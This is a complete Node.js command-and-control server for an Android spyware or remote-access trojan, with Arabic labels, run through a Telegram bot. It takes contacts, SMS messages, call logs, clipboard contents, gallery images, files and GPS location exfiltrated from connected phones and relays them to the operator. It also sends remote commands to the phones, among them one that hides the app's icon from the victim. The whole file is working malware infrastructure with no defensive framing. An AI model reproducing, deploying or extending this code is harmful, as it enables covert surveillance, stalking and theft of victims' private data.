require('dotenv').config();
const express = require('express');
const webSocket = require('ws');
const http = require('http');
const https = require('https');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');

const token = process.env.TG_TOKEN;
const id = process.env.TG_ID;
const AGENT_SECRET = process.env.AGENT_SECRET || 'default_secret';

if (!token || !id) { console.error('Missing tokens'); process.exit(1); }

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(token, { polling: true });
const appClients = new Map();
const upload = multer();
app.use(bodyParser.json({ limit: '100mb' }));

app.get('/health', (req, res) => res.status(200).send('OK'));
app.get('/', (req, res) => res.send('<h1>Queen Hadil Service Online</h1>'));

const SELF_URL = process.env.RENDER_EXTERNAL_URL || null;
if (SELF_URL) {
    setInterval(() => {
        https.get(`${SELF_URL}/health`, (res) => {}).on('error', () => {});
    }, 14 * 60 * 1000);
}

function escapeHtml(str) {
    return String(str || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

async function sendLongText(title, agentId, text) {
    const MAX = 3500;
    const total = (text || '').length;
    await appBot.sendMessage(id, `${title}\n📱 من: <b>${agentId}</b>\n📊 ${total} حرف`, { parse_mode: 'HTML' }).catch(() => {});
    if (total === 0) { await appBot.sendMessage(id, '📭 (فارغ)').catch(() => {}); return; }
    const chunks = [];
    for (let i = 0; i < total; i += MAX) chunks.push(text.substring(i, i + MAX));
    for (let i = 0; i < chunks.length; i++) {
        const prefix = chunks.length > 1 ? `<b>[${i + 1}/${chunks.length}]</b>\n` : '';
        await appBot.sendMessage(id, prefix + `<pre>${escapeHtml(chunks[i])}</pre>`, { parse_mode: 'HTML' }).catch(() => {});
        if (i < chunks.length - 1) await new Promise(r => setTimeout(r, 700));
    }
}

app.post('/uploadFile', upload.single('file'), (req, res) => {
    if (!req.file) return res.status(400).send('No file');
    const ext = req.file.originalname.split('.').pop().toLowerCase();
    const caption = `°• ملف من <b>${req.headers.model || '?'}</b>\n📄 ${req.file.originalname}`;
    if (['jpg', 'jpeg', 'png', 'gif', 'webp', 'bmp'].includes(ext))
        appBot.sendPhoto(id, req.file.buffer, { caption, parse_mode: 'HTML' }).catch(() => {});
    else if (['mp3', 'ogg', 'wav', 'm4a', 'aac'].includes(ext))
        appBot.sendAudio(id, req.file.buffer, { caption, parse_mode: 'HTML' }).catch(() => {});
    else if (['mp4', 'avi', 'mov', 'mkv', '3gp'].includes(ext))
        appBot.sendVideo(id, req.file.buffer, { caption, parse_mode: 'HTML' }).catch(() => {});
    else
        appBot.sendDocument(id, req.file.buffer, { caption, parse_mode: 'HTML' }, { filename: req.file.originalname }).catch(() => {});
    res.send('');
});

app.post('/uploadText', async (req, res) => {
    await sendLongText(req.body.title || 'نص', req.body.agentId || '?', req.body.text || '');
    res.send('');
});

app.post('/uploadContacts', async (req, res) => {
    try {
        const list = JSON.parse(req.body.list || '[]');
        let text = '';
        list.forEach((c, i) => { text += `${i + 1}. ${c.name || '?'}\n   📞 ${c.phone || '?'}\n`; });
        await sendLongText(`👥 جهات الاتصال (${list.length})`, req.body.agentId || '?', text);
    } catch (e) {}
    res.send('');
});

app.post('/uploadMessages', async (req, res) => {
    try {
        const list = JSON.parse(req.body.list || '[]');
        let text = '';
        list.forEach((m, i) => { text += `${i + 1}. من: ${m.from || '?'}\n   ${(m.body || '').substring(0, 200)}\n\n`; });
        await sendLongText(`💬 الرسائل (${list.length})`, req.body.agentId || '?', text);
    } catch (e) {}
    res.send('');
});

app.post('/uploadCalls', async (req, res) => {
    try {
        const list = JSON.parse(req.body.list || '[]');
        let text = '';
        list.forEach((c, i) => { text += `${i + 1}. ${c.type || '?'} — ${c.number || '?'}\n   ⏱️ ${c.duration || 0} ثانية\n\n`; });
        await sendLongText(`📞 سجل المكالمات (${list.length})`, req.body.agentId || '?', text);
    } catch (e) {}
    res.send('');
});

app.post('/uploadApps', async (req, res) => {
    try {
        const list = JSON.parse(req.body.list || '[]');
        let text = '';
        list.forEach((a, i) => { text += `${i + 1}. ${a.name || '?'}\n   📦 ${a.package || '?'}\n`; });
        await sendLongText(`📱 التطبيقات (${list.length})`, req.body.agentId || '?', text);
    } catch (e) {}
    res.send('');
});

app.post('/uploadClipboard', async (req, res) => {
    await sendLongText(`📋 الحافظة`, req.body.agentId || '?', req.body.text || '(فارغة)');
    res.send('');
});

app.post('/uploadGallery', async (req, res) => {
    try {
        const list = JSON.parse(req.body.list || '[]');
        let text = `للحصول على صورة:\n send_image:ID \n\n`;
        list.forEach((img, i) => {
            text += `${i + 1}. 🖼️ ${img.name || '?'}\n   🆔 ID: ${img.id || '?'}\n   📦 ${img.size || 0} بايت\n`;
        });
        await sendLongText(`🖼️ صور المعرض (${list.length})`, req.body.agentId || '?', text);
    } catch (e) {}
    res.send('');
});

app.post('/uploadLocation', (req, res) => {
    appBot.sendLocation(id, req.body.lat, req.body.lon).catch(() => {});
    appBot.sendMessage(id, `📍 موقع من <b>${req.body.agentId || '?'}</b>`, { parse_mode: 'HTML' }).catch(() => {});
    res.send('');
});

appSocket.on('connection', (ws, req) => {
    const authKey = req.headers['x-agent-key'];
    if (AGENT_SECRET !== 'default_secret' && authKey !== AGENT_SECRET) {
        ws.close(1008, 'Unauthorized'); return;
    }
    const uuid = uuid4.v4();
    const model = req.headers.model || 'Unknown';
    const battery = req.headers.battery || 'N/A';
    const version = req.headers.version || 'N/A';
    const provider = req.headers.provider || 'N/A';
    ws.uuid = uuid;
    ws.isAlive = true;
    appClients.set(uuid, { model, battery, version, provider });

    appBot.sendMessage(id,
        `🟢 <b>جهاز جديد متصل</b>\n\n📱 الموديل: <b>${model}</b>\n🔋 البطارية: <b>${battery}</b>\n🤖 النظام: <b>${version}</b>\n📶 الشبكة: <b>${provider}</b>\n🆔 ID: <code>${uuid}</code>`,
        { parse_mode: 'HTML' }
    ).catch(() => {});

    ws.on('pong', () => { ws.isAlive = true; });
    ws.on('close', () => {
        appClients.delete(ws.uuid);
        appBot.sendMessage(id, `🔴 انقطع الاتصال\n• ${model}`, { parse_mode: 'HTML' }).catch(() => {});
    });
    ws.on('error', (e) => {});
});

const kbMain = {
    parse_mode: 'HTML',
    reply_markup: { keyboard: [['📱 الأجهزة المتصلة'], ['🎮 لوحة التحكم']], resize_keyboard: true }
};

const cmdsForDevice = (uuid) => ({
    inline_keyboard: [
        [{ text: '🥷 إخفاء الأيقونة', callback_data: `hide_icon:${uuid}` }, { text: '📊 معلومات', callback_data: `device_info:${uuid}` }],
        [{ text: '📦 التطبيقات', callback_data: `apps:${uuid}` }, { text: '📍 الموقع', callback_data: `location:${uuid}` }],
        [{ text: '📂 الجذر', callback_data: `list_sdcard:${uuid}` }, { text: '🖼️ المعرض', callback_data: `gallery:${uuid}` }],
        [{ text: '📞 المكالمات', callback_data: `calls:${uuid}` }, { text: '💬 الرسائل', callback_data: `messages:${uuid}` }],
        [{ text: '👥 جهات الاتصال', callback_data: `contacts:${uuid}` }, { text: '📳 اهتزاز', callback_data: `vibrate:${uuid}` }],
        [{ text: '📁 مسار مخصص', callback_data: `file:${uuid}` }],
        [{ text: '🔙 رجوع', callback_data: `back:${uuid}` }]
    ]
});

appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (chatId.toString() !== id.toString()) return;
    const text = message.text;
    if (!text) return;

    if (text === '/start') {
        appBot.sendMessage(id, '👑 <b>لوحة التحكم المركزية - ناصر دين الله الكلعي</b>\n\nاختر من الأزرار:', kbMain);
        return;
    }
    if (text === '📱 الأجهزة المتصلة' || text === 'الاجهزة المتصلة') {
        if (appClients.size === 0) return appBot.sendMessage(id, '❌ لا توجد أجهزة متصلة حالياً');
        let t = '📱 <b>الأجهزة النشطة:</b>\n\n';
        appClients.forEach((v, k) => { t += `• <b>${v.model}</b>\n   🔋 ${v.battery} | 🤖 ${v.version}\n   🆔 <code>${k}</code>\n\n`; });
        appBot.sendMessage(id, t, { parse_mode: 'HTML' });
        return;
    }
    if (text === '🎮 لوحة التحكم' || text === 'تنفيذ الامر') {
        if (appClients.size === 0) return appBot.sendMessage(id, '❌ لا توجد أجهزة متصلة');
        const kb = [];
        appClients.forEach((v, k) => { kb.push([{ text: `📱 ${v.model}`, callback_data: `device:${k}` }]); });
        appBot.sendMessage(id, '🎮 حدد الجهاز للسيطرة:', { reply_markup: { inline_keyboard: kb } });
        return;
    }
});

appBot.on('callback_query', async (cb) => {
    const msg = cb.message;
    const [cmd, uuid] = cb.data.split(':');
    const agent = uuid ? appClients.get(uuid) : null;

    const sendCmd = (cmdStr) => {
        let sent = false;
        appSocket.clients.forEach((ws) => { if (ws.uuid === uuid) { ws.send(cmdStr); sent = true; } });
        return sent;
    };

    const delAndSend = async (text) => {
        await appBot.deleteMessage(id, msg.message_id).catch(() => {});
        await appBot.sendMessage(id, text, kbMain).catch(() => {});
    };

    if (cmd === 'device') {
        if (!agent) return appBot.answerCallbackQuery(cb.id, { text: 'الجهاز غير متصل' });
        await appBot.editMessageText(`🎮 <b>${agent.model}</b>\n\nاختر الأمر المطلوب تنفيذه:`,
            { chat_id: id, message_id: msg.message_id, parse_mode: 'HTML', reply_markup: cmdsForDevice(uuid) }).catch(() => {});
        return;
    }
    if (cmd === 'back') {
        const kb = [];
        appClients.forEach((v, k) => { kb.push([{ text: `📱 ${v.model}`, callback_data: `device:${k}` }]); });
        await appBot.editMessageText('🎮 حدد الجهاز:', { chat_id: id, message_id: msg.message_id, reply_markup: { inline_keyboard: kb } }).catch(() => {});
        return;
    }

    const instant = ['device_info', 'apps', 'location', 'clipboard', 'vibrate',
                     'calls', 'messages', 'contacts', 'gallery', 'list_sdcard', 'hide_icon'];

    if (instant.includes(cmd)) {
        if (!agent) return appBot.answerCallbackQuery(cb.id, { text: 'الجهاز غير متصل' });
        const ok = sendCmd(cmd);
        await delAndSend(ok ? `✅ تم إرسال الأمر: <b>${cmd}</b>\n⏳ جاري المعالجة...` : '❌ فشل إرسال الأمر');
        return;
    }

    if (cmd === 'file') {
        if (!agent) return appBot.answerCallbackQuery(cb.id, { text: 'غير متصل' });
        await appBot.sendMessage(id,
            '📁 <b>أدخل أحد الأوامر المتقدمة:</b>\n\n' +
            '• <code>list:DCIM</code>\n' +
            '• <code>send_dir:DCIM/Camera</code>\n' +
            '• <code>send_image:ID</code>\n' +
            '• <code>send_video:ID</code>\n' +
            '• <code>file:Download</code>',
            { parse_mode: 'HTML', reply_markup: { force_reply: true } });
        return;
    }
});

appBot.on('message', async (message) => {
    if (!message.reply_to_message) return;
    if (message.chat.id.toString() !== id.toString()) return;
    const orig = message.reply_to_message.text || '';
    if (!orig.includes('أدخل')) return;

    let uuid = null;
    appClients.forEach((v, k) => { if (!uuid) uuid = k; });
    if (!uuid) return;

    const cmd = (message.text || '').trim();
    if (!cmd) return;

    appSocket.clients.forEach((ws) => { if (ws.uuid === uuid) ws.send(cmd); });
    appBot.sendMessage(id, `📤 جاري تنفيذ: <code>${cmd}</code>`, { parse_mode: 'HTML', ...kbMain });
});

setInterval(() => {
    appSocket.clients.forEach((ws) => {
        if (ws.isAlive === false) return ws.terminate();
        ws.isAlive = false;
        try { ws.ping(); } catch (e) {}
    });
}, 30000);

const PORT = process.env.PORT || 8999;
appServer.listen(PORT, '0.0.0.0', () => console.log(`✅ Server active on port ${PORT}`));
